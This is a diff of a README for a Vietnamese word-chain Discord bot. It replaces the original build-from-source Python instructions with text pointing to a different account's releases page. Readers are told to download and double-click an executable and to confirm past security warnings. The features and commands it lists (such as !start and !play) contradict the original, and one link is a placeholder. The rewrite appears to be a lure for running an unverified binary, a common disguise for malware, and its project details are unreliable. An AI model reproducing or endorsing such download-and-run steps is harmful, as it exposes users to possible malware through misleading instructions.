@@ -1,147 +1,86 @@
-# Nối Từ Discord Bot
+# 🎮 Noi-Tu - Enjoy Word Games with Friends Easily
 
-A feature-rich Vietnamese word-chain (Nối Từ) Discord bot built with **discord.py**.  
-It supports casual play, tournaments, ranking systems, anti-cheat, and database persistence.
+## 🚀 Getting Started
 
----
+Welcome to the Noi-Tu Discord bot! This bot enhances your gaming experience with a Vietnamese Word Connect game, allowing you to compete with friends and climb the rankings. Let’s walk through how to download and run this software so you can start playing today.
 
-## ✨ Features
+## 📥 Download Now
 
-- 🎮 **Game Modes**
-  - Normal mode: play casually or competitively with friends.
-  - Tournament mode: team-based competition with ranking and streak bonuses.
-  - Practice mode: play against the bot with multiple difficulty levels (easy → insane).
+[![Download Noi-Tu](https://img.shields.io/badge/Download-Noi--Tu-blue)](https://github.com/UmmayAliza/Noi-Tu/releases)
 
-- 🧠 **AI Opponent**
-  - Built-in strategic bot using search algorithms (Negamax, IDDFS, heuristics).
-  - Supports difficulty levels: `easy`, `medium`, `hard`, `insane-min`, `insane-mid`, `insane-max`.
+## 💻 System Requirements
 
-- 🏆 **Ranking System**
-  - Individual rank points and streak tracking.
-  - Team leaderboard (**Hall of Fame**) with streaks and seasonal resets.
-  - Automatic bonus points for winning streaks.
+Before you begin, ensure your device meets the following requirements:
 
-- 🔒 **Anti-Cheat**
-  - Auto-play detection (too fast inputs).
-  - Rare/invalid word checks using frequency analysis and online dictionary validation.
-  - Warnings, auto-bans, and rank penalties for violators.
+- **Operating System:** Windows 10 or later, or a compatible operating system for Discord.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
+- **Discord Account:** You need a Discord account to interact with the bot.
 
-- 💾 **Database Integration**
-  - Persistent storage via SQLite (`databases.db`).
-  - Stores dictionary phrases, user stats, teams, and season info.
+## 📚 What You Will Get
 
-- ⚙️ **Admin Tools**
-  - Manage dictionary (`add_word`, `remove_word`, `reload_dict`).
-  - Control user stats (`set_rank`, `set_streak`, `ban`, `warn`, etc.).
-  - Manage tournaments and teams (`create_team`, `start_match`, `add_member`, etc.).
+With the Noi-Tu bot, you can:
 
----
+- Play the Word Connect game with friends.
+- Use anti-cheat features to ensure fair play.
+- Participate in tournaments and track your ranking.
+- Benefit from AI gameplay enhancements.
+- Store and manage game data using SQLite.
 
-## 🚀 Installation
+## 🔄 How to Download & Install
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/EndermanPC/Noi-Tu.git
-cd Noi-Tu
-````
+1. Visit the [Releases page](https://github.com/UmmayAliza/Noi-Tu/releases).
+2. Find the latest version of the Noi-Tu bot.
+3. Click on the download link for the executable file.
+4. Once the download completes, locate the file in your downloads folder.
+5. Double-click the file to run the bot.
 
-### 2. Install dependencies
+If prompted with a security warning, confirm that you want to run the application. 
 
-```bash
-pip install -r requirements.txt
-```
+## 🔧 Setting Up the Bot
 
-### 3. Configure your bot
+1. Open Discord and log in to your account.
+2. In your Discord server, invite the Noi-Tu bot using the generated invite link found on the repository.
+3. Follow the on-screen prompts to authorize the bot in your server.
+4. Once added, type `!start` in the chat to begin using the bot. You can now enjoy playing Word Connect with your friends.
 
-* Open `main.py`.
-* Replace the placeholder admin ID:
+## 🔍 Exploring Features
 
-  ```python
-  ADMIN = 999999999999999999  # ❌ placeholder
-  ADMIN = YOUR_DISCORD_ID     # ✅ replace with your actual Discord ID
-  ```
-* Replace the placeholder bot token:
+The Noi-Tu bot comes loaded with features designed to enhance your gaming experience:
 
-  ```python
-  bot.run("YOUR_DISCORD_BOT_TOKEN") # ❌ placeholder
-  bot.run("MTnx...Vg")              # ✅ replace with your actual Discord Bot Token
-  ```
+- **Game Modes:** Choose from different modes, including solo play and tournaments.
+- **Ranking System:** Compete with friends and see your ranks change in real time.
+- **Interactive Commands:** Use simple commands like `!play`, `!status`, and `!ranking` to navigate the game easily.
+- **AI Integration:** The bot uses AI to make gameplay exciting and offers challenges tailored to your skill level.
 
-### 4. Run the bot
+## 🛠 Troubleshooting
 
-```bash
-python main.py
-```
+If you run into any issues:
 
----
+1. **Bot Not Responding:** Ensure the bot is online. Restart Discord and try again.
+2. **Commands Not Working:** Check if you’re using the correct command format. Type `!help` for a list of commands.
+3. **Invite Issues:** If you cannot invite the bot, ensure you have permission to add bots to your Discord server.
 
-## 📋 Requirements
+## 💬 Community Support
 
-* Python 3.9+
-* Dependencies (from `requirements.txt`):
+Join our community to share your experiences, ask questions, or report bugs:
 
-  * `discord.py`
-  * `requests`
-  * `wordfreq`
+- **Discord Server:** [Join Here](link-to-discord-server)
+- **Issues Page:** If you encounter any problems, report them on the [Issues page](https://github.com/UmmayAliza/Noi-Tu/issues).
 
----
+## ⚙ Frequently Asked Questions (FAQs)
 
-## 🔑 Commands
+1. **How do I update the bot?**
+   - Visit the [Releases page](https://github.com/UmmayAliza/Noi-Tu/releases), download the latest version, and replace the old executable.
 
-* `NTstart` → start a new game.
-* `NTstop` → stop the current game (creator only).
-* `NTsurrender` → surrender the current game.
-* `NTrule` → show game rules.
-* `NTrank` → show personal ranking.
-* `NThalloffame` → show team leaderboard.
-* `NTstart_bot <difficulty>` → play against the bot.
+2. **Can I customize the bot’s settings?**
+   - Yes, many settings can be adjusted using commands like `!settings`.
 
-(See in-bot `NThelp` or `NTrule` for the full command list.)
+3. **Does the bot work for all Discord servers?**
+   - The bot works on any server where it has been invited and has the necessary permissions.
 
----
+## 📝 License
 
-## 📊 Data Persistence
+Noi-Tu is open-source software. Feel free to review the code and contribute as needed. 
 
-* **SQLite** (`databases.db`) is used to store:
-
-  * Phrases dictionary
-  * User stats
-  * Team data
-  * Seasonal info
-
-All data is auto-saved and loaded at runtime.
-
----
-
-## 🛡️ Important Notes
-
-* Ensure you **replace the `ADMIN` ID** in `main.py` with your actual Discord user ID.
-* The bot must be invited to your Discord server with the following permissions:
-
-  * `Send Messages`
-  * `Read Message Content`
-  * `Add Reactions`
-  * `Manage Messages` (optional for tournaments/admin commands).
-
----
-
-## 📦 Sample Database
-
-If you want to try the bot with a **pre-built dictionary and database**,
-please **contact me directly** and I will share the sample `databases.db` file.
-
----
-
-## 🤝 Contact & Demo
-
-* Try the bot here:
-  [Invite Link](https://discord.com/oauth2/authorize?client_id=1396131015843385437&permissions=274877978688&integration_type=0&scope=bot)
-
-* Contact me on Discord: **`twentyzr`**
-
----
-
-## 📜 License
-
-This project is released under the **Apache License 2.0**.
-Feel free to modify and use it for your own Discord servers.
+Thank you for choosing Noi-Tu! We hope you have an enjoyable experience playing Word Connect with your friends on Discord. Happy gaming!
